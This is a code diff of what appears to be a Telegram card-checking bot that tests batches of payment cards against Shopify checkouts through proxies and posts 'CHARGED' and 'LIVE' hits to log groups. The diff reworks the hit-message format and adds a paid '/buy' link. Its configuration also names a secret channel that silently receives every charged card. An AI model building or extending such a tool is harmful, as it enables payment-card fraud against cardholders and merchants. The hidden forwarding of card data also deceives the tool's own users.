@@ -69,7 +69,9 @@ EXTRA_CHARGED_GROUP_ID = -1003991915326   # extra charged log
 # ── Secret channel — auto-receives every CHARGED card silently ──────────────
 SECRET_CHANNEL_ID   = -1004499920555
 SECRET_CHANNEL_LINK = "https://t.me/+86iK7fXMWEY2MGRk"
-BTN_LABEL           = "⚡ Batmanchk"      # button shown on all result cards
+BTN_LABEL           = "⚡ Batmancardchk"   # button shown on all result cards
+BOT_USERNAME_LINK   = "https://t.me/batcardchk29_bot"
+BOT_BUY_LINK        = "https://t.me/batcardchk29_bot?start=buy"  # opens bot /buy
 
 SH_COOLDOWN    = 25
 SITE_RETRIES   = 40    # sites tried per card — matches msh.py MAX_RETRIES
@@ -1851,7 +1853,8 @@ def _make_result_file(sess: dict, kind: str) -> tuple:
 # HIT NOTIFICATIONS
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 async def _send_hit(bot, user, text: str, verdict: str, card: str = "",
-                    bin_data: dict = None, price: str = "0.00", currency: str = "USD"):
+                    bin_data: dict = None, price: str = "0.00", currency: str = "USD",
+                    plan: str = "TRIAL", resp: str = ""):
     bin_data = bin_data or {}
 
     # ── 1. DM the user who ran the check ────────────────────────────────────
@@ -1861,28 +1864,63 @@ async def _send_hit(bot, user, text: str, verdict: str, card: str = "",
     except Exception as e:
         logging.warning(f"[HIT] DM uid={user.id}: {e}")
 
-    # ── 2. Public hit-log group (short summary only) ─────────────────────────
+    # ── 2. Public hit-log group — compact card UI with bot name button ───────
     if HIT_LOG_GROUP_ID:
         try:
-            eid   = get_random_charged_emoji() if verdict == "CHARGED" else get_random_live_emoji()
-            label = "Charged" if verdict == "CHARGED" else "Live"
-            grp   = (
-                f'<b>{_te(HIT_GATE_EMOJI_ID,"🛒")} {label} '
-                f'{_te(eid,"💎" if verdict=="CHARGED" else "✅")}</b>\n'
-                f"<b>Gate ➳ Shopify Payments</b>\n"
-                f'<b>{_te(HIT_RESP_EMOJI_ID,"✅")} User ➳ {_user_link(user)}</b>'
+            eid     = get_random_charged_emoji() if verdict == "CHARGED" else get_random_live_emoji()
+            peid    = _plan_eid(plan)
+            ulink   = _user_link(user)
+            safe_r  = escape(resp or "Unknown")
+
+            if verdict == "CHARGED":
+                hit_icon   = _te(eid, "💎")
+                hit_label  = "CHARGED"
+                gate_line  = f"<b>Gate ➛ Shopify • {_fmt_price(price, currency)}</b>"
+            elif verdict == "TDS":
+                hit_icon   = _te(eid, "✅")
+                hit_label  = "LIVE [3DS]"
+                gate_line  = "<b>Gate ➛ Shopify</b>"
+            else:
+                hit_icon   = _te(eid, "✅")
+                hit_label  = "LIVE"
+                gate_line  = "<b>Gate ➛ Shopify</b>"
+
+            grp = (
+                f'<b>HIT ➛ {hit_label} {hit_icon}</b>\n'
+                f'{gate_line}\n'
+                f'<b>{_te(HIT_RESP_EMOJI_ID,"✅")} {safe_r}</b>\n'
+                f'<b>{_te(USER_EMOJI_ID,"👤")} User ➛ {ulink} {_te(peid,"⭐")}</b>'
             )
+            grp_kb = RawMarkup([[
+                _btn(f"⚡ {BOT_NAME}", url=BOT_BUY_LINK, style="primary"),
+            ]])
             await bot.send_message(chat_id=HIT_LOG_GROUP_ID, text=grp,
-                                   parse_mode="HTML", disable_web_page_preview=True)
+                                   parse_mode="HTML", disable_web_page_preview=True,
+                                   reply_markup=grp_kb)
         except Exception as e:
             logging.warning(f"[HIT] log group: {e}")
 
-    # ── 3. Extra charged group ────────────────────────────────────────────────
+    # ── 3. Extra charged group — same compact UI as hit-log ──────────────────
     if verdict == "CHARGED" and EXTRA_CHARGED_GROUP_ID:
         try:
             await asyncio.sleep(0.3)
-            await bot.send_message(chat_id=EXTRA_CHARGED_GROUP_ID, text=text,
-                                   parse_mode="HTML", disable_web_page_preview=True)
+            eid_x    = get_random_charged_emoji()
+            peid_x   = _plan_eid(plan)
+            ulink_x  = _user_link(user)
+            safe_r_x = escape(resp or "ORDER_PAID")
+
+            ext_grp = (
+                f'<b>HIT ➛ CHARGED {_te(eid_x,"💎")}</b>\n'
+                f'<b>Gate ➛ Shopify • {_fmt_price(price, currency)}</b>\n'
+                f'<b>{_te(HIT_RESP_EMOJI_ID,"✅")} {safe_r_x}</b>\n'
+                f'<b>{_te(USER_EMOJI_ID,"👤")} User ➛ {ulink_x} {_te(peid_x,"⭐")}</b>'
+            )
+            ext_kb = RawMarkup([[
+                _btn(f"⚡ {BOT_NAME}", url=BOT_BUY_LINK, style="primary"),
+            ]])
+            await bot.send_message(chat_id=EXTRA_CHARGED_GROUP_ID, text=ext_grp,
+                                   parse_mode="HTML", disable_web_page_preview=True,
+                                   reply_markup=ext_kb)
         except Exception as e:
             logging.warning(f"[HIT] extra group: {e}")
 
@@ -1991,6 +2029,7 @@ async def run_mass_batch(bot, sid, valid_cards, user, plan, all_sites, proxies):
                 asyncio.create_task(_send_hit(
                     bot, user, msg, "CHARGED",
                     card=card_fmt, bin_data=bin_data, price=price, currency=currency,
+                    plan=plan, resp=raw_resp,
                 ))
                 asyncio.create_task(_update_progress(bot, sid, force=True))
 
@@ -2003,6 +2042,7 @@ async def run_mass_batch(bot, sid, valid_cards, user, plan, all_sites, proxies):
                 asyncio.create_task(_send_hit(
                     bot, user, msg, "TDS",
                     card=card_fmt, bin_data=bin_data, price=price, currency=currency,
+                    plan=plan, resp=raw_resp,
                 ))
                 asyncio.create_task(_update_progress(bot, sid, force=True))
 
@@ -2014,6 +2054,7 @@ async def run_mass_batch(bot, sid, valid_cards, user, plan, all_sites, proxies):
                 asyncio.create_task(_send_hit(
                     bot, user, msg, "LIVE",
                     card=card_fmt, bin_data=bin_data, price=price, currency=currency,
+                    plan=plan, resp=raw_resp,
                 ))
                 asyncio.create_task(_update_progress(bot, sid, force=True))
 
@@ -2213,8 +2254,8 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text    = build_result_msg(card, resp, verdict, bin_data,
                                price, currency, elapsed, user, plan)
 
-    # Always show "⚡ Batmanchk" button → secret channel link
-    kb = RawMarkup([[_btn(BTN_LABEL, url=SECRET_CHANNEL_LINK, style="primary")]])
+    # Always show bot name button → opens /buy in bot
+    kb = RawMarkup([[_btn(BTN_LABEL, url=BOT_BUY_LINK, style="primary")]])
 
     try:
         await spin.edit_text(text, parse_mode="HTML",
@@ -2227,6 +2268,7 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
         asyncio.create_task(_send_hit(
             context.bot, user, text, verdict,
             card=card, bin_data=bin_data, price=price, currency=currency,
+            plan=plan, resp=resp,
         ))
 
 
